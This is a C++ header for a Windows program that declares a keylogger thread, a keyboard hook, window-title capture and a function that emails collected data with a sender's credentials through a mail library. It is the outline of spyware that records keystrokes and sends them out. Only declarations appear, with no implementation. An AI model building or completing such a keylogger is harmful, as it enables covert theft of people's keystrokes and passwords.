#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
#include "winmanager.h"
#include <CkMailMan.h>
#include <CkEmail.h>
using namespace std;

DWORD WINAPI Keylogger(LPVOID lpParm);
LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam);
void sendmail(char* senderId, char* senderPw, char* receiver);
void wintitle();
void FSD(char* senderId, char* senderPw, char* receiver);